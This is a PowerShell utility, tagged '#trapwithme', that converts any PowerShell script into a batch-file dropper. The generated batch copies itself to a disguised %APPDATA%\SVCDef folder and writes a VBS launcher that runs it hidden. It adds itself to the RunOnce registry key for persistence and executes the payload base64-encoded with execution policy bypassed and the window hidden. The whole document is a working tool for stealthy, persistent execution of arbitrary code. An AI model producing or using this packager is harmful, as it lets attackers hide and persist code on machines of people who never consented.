#trapwithme
param([string]$Filepattern = "")

function Convert-PowerShellToBatch {
    param
    (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string]
        [Alias("FullName")]
        $Path
    )
 
    process {
        try {
            # Define output directory for VBS and copied batch in %APPDATA%\SVCDef
            $vbsDir = Join-Path $env:APPDATA "SVCDef"
            if (-not (Test-Path -Path $vbsDir)) {
                New-Item -Path $vbsDir -ItemType Directory -Force | Out-Null
            }

            # Read and encode the PowerShell script
            $scriptContent = Get-Content -Path $Path -Raw -Encoding UTF8
            $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
            
            # Create batch file in the same directory as the .ps1
            $fileName = [Io.Path]::GetFileNameWithoutExtension($Path)
            $batDir = Split-Path -Path $Path -Parent
            $batPath = Join-Path $batDir "$fileName.bat"
            $vbsPath = Join-Path $vbsDir "$fileName.vbs"
            $copiedBatPath = Join-Path $vbsDir "$fileName.bat"

            # Universal batch content using global environment variables and full PowerShell path
            $batContent = @"
@echo off
set "VBSPath=%APPDATA%\SVCDef\$fileName.vbs"
set "CopiedBatPath=%APPDATA%\SVCDef\$fileName.bat"
set "BatPath=%~f0"
set "RegKey=HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set "RegName=SVCDef_$fileName"

:: Copy this batch file to %APPDATA%\SVCDef
copy "%BatPath%" "%CopiedBatPath%" >nul

:: Create VBS file to run the copied batch hidden
echo Set WShell = CreateObject("WScript.Shell") > "%VBSPath%"
echo WShell.Run "cmd.exe /c """"%CopiedBatPath%""""", 0, True >> "%VBSPath%"

:: Add VBS to RunOnce registry key
reg add "%RegKey%" /v "%RegName%" /t REG_SZ /d "wscript.exe ""%VBSPath%""" /f >nul

:: Run the encoded PowerShell script hidden using full PowerShell path
%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded
"@

            Set-Content -Path $batPath -Value $batContent -Encoding Ascii

            Write-Output "Created $batPath. When executed, it will copy itself to $copiedBatPath, create $vbsPath to run the copied batch, add to RunOnce registry, and run the encoded script hidden."
        }
        catch {
            Write-Error "⚠️ Error processing $Path : $($_.Exception.Message)"
        }
    }
}
 
try {
    if ($Filepattern -eq "") { 
        $Filepattern = Read-Host "Enter path to the PowerShell script(s)" 
    }

    $Files = Get-ChildItem -Path $Filepattern -File -ErrorAction Stop
    if ($Files.Count -eq 0) {
        throw "No files found matching pattern: $Filepattern"
    }

    foreach ($File in $Files) {
        Convert-PowerShellToBatch -Path $File.FullName
    }
    Write-Output "Conversion completed successfully."
    exit 0 # success
} catch {
    Write-Error "⚠️ Error in line $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)"
    exit 1
}